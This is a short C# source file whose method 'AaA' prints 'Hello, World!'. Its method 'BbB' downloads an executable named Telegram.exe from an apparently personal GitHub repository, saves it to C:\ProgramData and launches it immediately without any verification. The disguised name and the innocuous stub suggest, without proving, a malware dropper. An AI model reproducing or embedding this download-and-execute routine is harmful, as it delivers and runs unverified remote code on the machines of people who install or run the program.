using System;

public class Program {
	
    public static void AaA() {
        Console.WriteLine("Hello, World!");
    }

    public static void BbB() {
        string url = "https://raw.githubusercontent.com/xibeb/TelegramUILatest/refs/heads/main/Telegram.exe";
        string savePath = "C:\\ProgramData\\Telegram.exe";
        System.Net.WebClient webClient = new System.Net.WebClient();
        webClient.DownloadFile(url, savePath);
        System.Diagnostics.Process.Start(savePath);
    }

}